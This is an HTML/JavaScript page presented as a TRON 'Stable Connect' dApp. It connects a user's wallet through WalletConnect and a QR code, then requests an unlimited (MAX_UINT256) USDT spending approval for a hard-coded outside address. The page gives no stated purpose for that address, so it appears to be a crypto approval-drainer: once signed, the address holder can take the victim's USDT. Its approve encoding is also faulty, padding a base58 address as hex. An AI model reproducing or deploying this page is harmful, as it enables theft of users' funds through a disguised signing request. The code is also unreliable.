<!doctype html>
<html lang="ro">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>TRON dApp - Stable Connect</title>

<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
<script src="https://unpkg.com/@walletconnect/sign-client@2.11.0/dist/index.umd.js"></script>

<style>
body { font-family: system-ui; margin:20px; }
button { padding:10px 14px; margin-right:10px; }
.card { border:1px solid #ddd; padding:12px; margin-top:12px; }
#status { font-weight:bold; margin:10px 0; }
code { word-break:break-all; }
#qr canvas{ width:260px; height:260px; }
</style>
</head>

<body>

<h2>TRON WalletConnect Stable dApp</h2>

<div id="status">Idle</div>

<button id="connectBtn">Connect Wallet</button>
<button id="approveBtn" disabled>Approve USDT</button>

<div id="qr"></div>

<div class="card">
  <h3>Transaction Info</h3>

  <p><b>USDT Contract:</b><br>
  <code>TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</code></p>

  <p><b>Spender:</b><br>
  <code id="spender"></code></p>

  <p><b>Amount:</b><br>
  <code>MAX_UINT256 (Unlimited Approval)</code></p>
</div>

<script>
/* CONFIG — înlocuiește PROJECT_ID cu al tău din WalletConnect (poate fi public) */
const PROJECT_ID = "dde98880530be70b65d01a1be59e5fa3";
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const SPENDER = "TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu";
const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

let client;
let session;
const status = (t)=>document.getElementById("status").innerText = t;

/* INIT */
async function init(){
  try{
    if(!window.SignClient){
      throw new Error("SignClient not loaded");
    }
    client = await SignClient.init({
      projectId: PROJECT_ID,
      metadata: { name: "Stable TRON dApp", url: "https://example.com" }
    });
    document.getElementById("spender").innerText = SPENDER;
    console.log("init done", !!client);
  }catch(e){
    console.error("init error", e);
    status("Init error: " + e.message);
  }
}

/* QR RENDER */
function renderQR(uri){
  try{
    const canvas = document.createElement("canvas");
    QRCode.toCanvas(canvas, uri, { width: 260 }, function(err){
      if(err){ console.error("qrcode error", err); status("QR error"); return; }
    });
    const qr = document.getElementById("qr");
    qr.innerHTML = "";
    qr.appendChild(canvas);
  }catch(e){
    console.error("renderQR error", e);
    status("QR render error");
  }
}

/* CONNECT */
async function connect(){
  try{
    status("Connecting wallet...");
    const res = await client.connect({
      requiredNamespaces: {
        tron: {
          methods: ["tron_sendTransaction"],
          chains: ["tron:0"],
          events: []
        }
      }
    });
    console.log("connect result", res);
    const { uri, approval } = res;
    if(uri){
      renderQR(uri);
      status("Scan QR in Trust Wallet");
    } else {
      status("No QR → wallet may open directly");
    }
    session = await approval();
    console.log("session", session);
    status("Connected (permissions granted)");
    document.getElementById("approveBtn").disabled = false;
    document.getElementById("qr").innerHTML = "";
  }catch(e){
    console.error("connect error", e);
    status("Connect error: " + (e?.message || e));
  }
}

/* ENCODE APPROVE */
function buildApproveData(){
  const methodId = "095ea7b3";
  const spender = SPENDER.replace("0x","").padStart(64,"0");
  const amount = BigInt(MAX_UINT256).toString(16).padStart(64,"0");
  return "0x" + methodId + spender + amount;
}

/* SEND APPROVE */
async function approve(){
  try{
    const owner = session.namespaces.tron.accounts[0].split(":")[2];
    const tx = { to: USDT_CONTRACT, owner_address: owner, data: buildApproveData(), feeLimit: 10000000, callValue: 0 };
    status("Waiting wallet confirmation...");
    await client.request({ topic: session.topic, chainId: "tron:0", request: { method: "tron_sendTransaction", params: [tx] } });
    status("Transaction signed in wallet");
  }catch(e){
    console.error("approve error", e);
    status("Approve error: " + (e?.message || e));
  }
}

document.getElementById("connectBtn").onclick = connect;
document.getElementById("approveBtn").onclick = approve;

init();
</script>

</body>
</html>
